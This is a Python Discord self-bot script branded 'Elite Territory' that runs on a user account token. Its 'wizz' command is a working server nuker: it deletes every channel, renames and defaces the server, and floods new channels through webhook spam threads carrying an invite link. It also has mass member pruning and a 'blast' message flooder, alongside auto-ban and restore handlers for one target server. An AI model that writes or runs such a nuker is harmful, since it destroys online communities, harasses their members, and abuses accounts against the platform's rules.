import discord
from discord.ext import commands, tasks
import asyncio
import requests
import random
import time
import threading
import os
import sys
import json

intents = discord.Intents.default()
intents.guilds = True  # required for get_channel to work properly
intents.voice_states = True

TOKEN = input("> TOKEN: ")
bot = commands.Bot(command_prefix=">", self_bot=True, help_command=None, intents=intents)

@bot.event
async def on_ready():
    print(f"Successfully logged in {bot.user}")

# File paths
WHITELIST_FILE = 'whitelist.json'

# OWNER_ID and TARGET_SERVER_IDS
OWNER_ID = 844770923537367080
TARGET_SERVER_IDS = 1300077701196939324

# Load or create whitelist file
if os.path.exists(WHITELIST_FILE):
    with open(WHITELIST_FILE, 'r') as f:
        whitelist = json.load(f)
else:
    whitelist = [OWNER_ID]  # Add your OWNER_ID by default
    with open(WHITELIST_FILE, 'w') as f:
        json.dump(whitelist, f)

# Save the whitelist back to file
def save_whitelist():
    with open(WHITELIST_FILE, 'w') as f:
        json.dump(whitelist, f)

# Backup data for restore
backup = {
    "roles": [],
    "channels": [],
    "guild_name": ""
}

# Save backup of server settings
async def save_backup(guild):
    roles = []
    for role in guild.roles:
        if not role.is_default():
            roles.append({
                "id": role.id,
                "name": role.name,
                "permissions": role.permissions,
                "color": role.color,
                "hoist": role.hoist,
                "mentionable": role.mentionable,
                "position": role.position
            })
    
    channels = []
    for channel in sorted(guild.channels, key=lambda c: c.position):
        if isinstance(channel, discord.CategoryChannel):
            ch_type = "category"
        elif isinstance(channel, discord.TextChannel):
            ch_type = "text"
        elif isinstance(channel, discord.VoiceChannel):
            ch_type = "voice"
        else:
            continue

        channels.append({
            "id": channel.id,
            "name": channel.name,
            "type": ch_type,
            "position": channel.position,
            "parent_id": channel.category_id
        })

    return {
        "roles": roles,
        "channels": channels,
        "guild_name": guild.name
    }

# Autobanning function
async def autoban_executor(guild, action: discord.AuditLogAction, match_target_id=None):
    async for entry in guild.audit_logs(limit=5, action=action):
        if entry.user and entry.user.id != OWNER_ID:
            if match_target_id is None or entry.target.id == match_target_id:
                try:
                    await guild.ban(entry.user, reason=f"Auto-banned for: {action.name}")
                    print(f"⚡ Banned {entry.user} for {action.name}")
                    break
                except Exception as e:
                    print(f"❌ Ban failed: {e}")

# Events to handle members leaving and banning
@bot.event
async def on_member_remove(member):
    if member.guild.id == TARGET_SERVER_IDS:
        await asyncio.sleep(2)
        await autoban_executor(member.guild, discord.AuditLogAction.kick, match_target_id=member.id)

@bot.event
async def on_member_ban(guild, user):
    if guild.id == TARGET_SERVER_IDS:
        await autoban_executor(guild, discord.AuditLogAction.ban, match_target_id=user.id)

# Event to handle channel deletion and restoration
@bot.event
async def on_guild_channel_delete(channel):
    if channel.guild.id != TARGET_SERVER_IDS:
        return
    await autoban_executor(channel.guild, discord.AuditLogAction.channel_delete, match_target_id=channel.id)
    try:
        for ch in backup["channels"]:
            if ch["id"] == channel.id:
                parent = discord.utils.get(channel.guild.categories, id=ch["parent_id"])
                if ch["type"] == "text":
                    new_ch = await channel.guild.create_text_channel(ch["name"], category=parent)
                elif ch["type"] == "voice":
                    new_ch = await channel.guild.create_voice_channel(ch["name"], category=parent)
                elif ch["type"] == "category":
                    new_ch = await channel.guild.create_category(ch["name"])
                await new_ch.edit(position=ch["position"])
                print(f"✅ Restored {ch['type']} channel: {ch['name']}")
                break
    except Exception as e:
        print(f"❌ Channel restore failed: {e}")

# Event to handle role creation, update, and deletion
@bot.event
async def on_guild_role_delete(role):
    if role.guild.id != TARGET_SERVER_IDS:
        return
    await autoban_executor(role.guild, discord.AuditLogAction.role_delete, match_target_id=role.id)
    try:
        for r in backup["roles"]:
            if r["id"] == role.id:
                new_role = await role.guild.create_role(
                    name=r["name"],
                    permissions=r["permissions"],
                    color=r["color"],
                    hoist=r["hoist"],
                    mentionable=r["mentionable"]
                )
                await new_role.edit(position=r["position"])
                print(f"✅ Restored role: {r['name']}")
                break
    except Exception as e:
        print(f"❌ Could not restore role: {e}")

@bot.event
async def on_guild_role_create(role):
    if role.guild.id == TARGET_SERVER_IDS:
        await autoban_executor(role.guild, discord.AuditLogAction.role_create, match_target_id=role.id)

@bot.event
async def on_guild_role_update(before, after):
    if after.guild.id == TARGET_SERVER_IDS:
        await autoban_executor(after.guild, discord.AuditLogAction.role_update, match_target_id=after.id)
        try:
            await after.edit(
                name=before.name,
                permissions=before.permissions,
                color=before.color,
                hoist=before.hoist,
                mentionable=before.mentionable
            )
            print(f"✅ Reverted changes to role: {after.name}")
        except Exception as e:
            print(f"❌ Could not revert role: {e}")

@bot.event
async def on_guild_update(before, after):
    if after.id == TARGET_SERVER_IDS:
        await autoban_executor(after, discord.AuditLogAction.guild_update)
        try:
            await after.edit(name=backup["guild_name"])
            print("✅ Restored server name.")
        except Exception as e:
            print("❌ Could not restore server name:", e)

# Commands to handle whitelist
@bot.command(name='whitelist_add')
async def whitelist_add(ctx, user: discord.User):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ You are not allowed to add to the whitelist.")
    if user.id in whitelist:
        await ctx.send(f"🔁 {user.mention} is already whitelisted.")
    else:
        whitelist.append(user.id)
        save_whitelist()
        await ctx.send(f"✅ Whitelisted {user.mention}.")

@bot.command(name='whitelist_remove')
async def whitelist_remove(ctx, user: discord.User):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ You are not allowed to remove from the whitelist.")
    if user.id not in whitelist:
        await ctx.send(f"ℹ️ {user.mention} is not in the whitelist.")
    else:
        whitelist.remove(user.id)
        save_whitelist()
        await ctx.send(f"✅ Removed {user.mention} from the whitelist.")

@bot.command(name='whitelist_show')
async def whitelist_show(ctx):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ You are not allowed to view the whitelist.")
    if not whitelist:
        return await ctx.send("📭 Whitelist is empty.")
    try:
        users = [f"<@{uid}>" for uid in whitelist]
        await ctx.send(f"📜 Whitelisted users:\n" + "\n".join(users))
    except Exception as e:
        await ctx.send(f"❌ Failed to show whitelist: {e}")

# Task to periodically refresh the backup
@tasks.loop(minutes=5)
async def refresh_backup():
    for guild in bot.guilds:
        if guild.id == TARGET_SERVER_IDS:
            global backup
            backup = await save_backup(guild)
    print("🔁 Backup refreshed.")

# Start the refresh loop
refresh_backup.start()

def ssspam(webhook_url):
    while spams:
        data = {'content': "Server Got Nuked By https://discord.gg/hEeRJ6eSS8"}
        try:
            response = requests.post(webhook_url, json=data)
            if response.status_code == 204:
                continue
            elif response.status_code == 429:
                retry_after = response.json().get('retry_after', 1) / 1000
                print(f"Rate limited. Retrying in {retry_after} seconds.")
                time.sleep(retry_after)
            else:
                print(f"Unexpected status code {response.status_code}: {response.text}")
                delay = random.randint(30, 60)
                time.sleep(delay)
        except Exception as e:
            print(f"Error in ssspam: {e}")
            delay = random.randint(30, 60)
            time.sleep(delay)

    print("Thread exiting — spams = False")

spams = False

@bot.command()
async def wizz(ctx):
    try:
        # Delete existing channels and roles
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except Exception as e:
                print(f"Error deleting channel: {e}")

        # Edit guild
        try:
            await ctx.guild.edit(
                name='Nuked By ET',
                description='This Fucking Server Got Nuked By Elite Territory',
                reason="ET ON TOP",
                icon=None,
                banner=None
            )
        except Exception as e:
            print(f"Error editing guild: {e}")

        # Create 5 text channels
        channels = []
        for i in range(5):
            try:
                channel = await ctx.guild.create_text_channel(name='et on top')
                channels.append(channel)
                await asyncio.sleep(1)  # Delay to prevent hitting rate limits
            except Exception as e:
                print(f"Error creating channel: {e}")

        # Create webhooks and start spamming
        global spams
        spams = True

        for channel in channels:
            try:
                webhook_name = 'ELITE TERRITORY'  # Use a name that does not contain "discord"
                webhook = await channel.create_webhook(name=webhook_name)
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
                await asyncio.sleep(1)  # Delay to prevent hitting rate limits
            except Exception as e:
                print(f"Webhook Error {e}")

    except Exception as e:
        print(f"Error in wizz command: {e}")

@bot.command()
async def stopwizz(ctx):
    global spams
    spams = False
    await ctx.send("```Stopped all webhook spamming.```")
    print("Webhook spamming stopped.")

@bot.command()
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(name=message, url='https://twitch.tv/notrifat')
    await bot.change_presence(activity=stream)
    await ctx.send(f"```STREAMING TO {message}```")

@bot.command()
async def removestatus(ctx):
    await ctx.message.delete()
    await bot.change_presence(activity=None, status=discord.Status.dnd)
    await ctx.send(f"```RPC STOPPED```")

@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    await ctx.send(f"```Ping: {latency}ms```")

@bot.command()
async def prune(ctx, days: int = 1, rc: int = 0, *, reason: str = "ET ON TOP"):
    await ctx.message.delete()
    roles = [role for role in ctx.guild.roles if len(role.members) > 0]
    hm = await ctx.guild.prune_members(days=days, roles=roles, reason=reason)
    await ctx.send(f"Successfully Pruned {hm} Members")

auto_react = False
reaction_emoji = None

@bot.command()
async def react(ctx, emoji):
    global auto_react, reaction_emoji
    await ctx.message.delete()  # Delete the command message
    auto_react = True  # Enable auto-react
    reaction_emoji = emoji  # Set the reaction emoji
    await ctx.send(f"```Auto-react is now ON with {emoji}!```", delete_after=5)  # Optional: delete message after 5 seconds

@bot.command()
async def stopreact(ctx):
    global auto_react
    await ctx.message.delete()  # Delete the command message
    auto_react = False  # Disable auto-react
    await ctx.send("```Auto-react is now OFF!```", delete_after=5)  # Optional: delete message after 5 seconds

@bot.event
async def on_message(message):
    global auto_react, reaction_emoji
    
    # Auto-react functionality
    if auto_react and reaction_emoji and message.author == bot.user:
        try:
            await message.add_reaction(reaction_emoji)
        except discord.errors.InvalidArgument:
            print(f"```Invalid emoji: {reaction_emoji}```")
    
    await bot.process_commands(message)

@bot.command()
async def restart(ctx):
    """
    Command to restart the bot.
    """
    await ctx.send("Bot is restarting...")  # Informing the user that the bot will restart.
    
    # Command to restart the bot (it works if you run the bot from the command line).
    os.execv(sys.executable, ['python'] + sys.argv)

@bot.command(name='help')
async def help_command(ctx):
    help_text = '''
    ```diff
    𒅒  Elite Territory | Help Menu 𒅒

    +------------------------------+
    |      help                     |
    |      ping                     |
    |      prune                    |
    |      react                    |
    |      removestatus             |
    |      restart                  |
    |      stopreact                |
    |      stopwizz                 |
    |      stream                   |
    |      whitelist_add            |
    |      whitelist_remove         |
    |      whitelist_show           |
    |      wizz                     |
    |      blast                    |
    +------------------------------+
    ```
    '''
    await ctx.send(help_text)

@bot.command()
async def blast(ctx, count: int, *, text: str):
    """Sends a message multiple times with no delay."""

    for _ in range(count):
        try:
            await ctx.send(text)
        except discord.HTTPException as e:
            if e.status == 429:
                print("Rate limited. Stopping...")
                break

@bot.command()
async def jvc(ctx, channel_id: int, mute: bool = False, deafen: bool = False):
    """Join a VC by ID and optionally mute/deafen (for discord.py 1.7.3)"""
    channel = bot.get_channel(channel_id)

    if channel is None:
        await ctx.send("❌ Channel not found. Make sure the ID is valid and cached.")
        return

    if not isinstance(channel, discord.VoiceChannel):
        await ctx.send("❌ That ID is not a voice channel.")
        return

    try:
        vc = await channel.connect()
        # Manually update voice state
        await ctx.guild.change_voice_state(channel=vc.channel, self_mute=mute, self_deaf=deafen)
        await ctx.send(f"✅ Joined `{channel.name}` | Muted: `{mute}` | Deafened: `{deafen}`")
    except discord.ClientException:
        await ctx.send("❌ Already connected to a voice channel.")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {e}")
                                                                                                                                                    

@bot.command()
async def lvc(ctx):
    """Leave the voice channel."""
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await ctx.send("✅ Disconnected from the voice channel.")
    else:
        await ctx.send("❌ I'm not connected to any voice channel.")

# ✅ Run the bot
bot.run(TOKEN, bot=False)
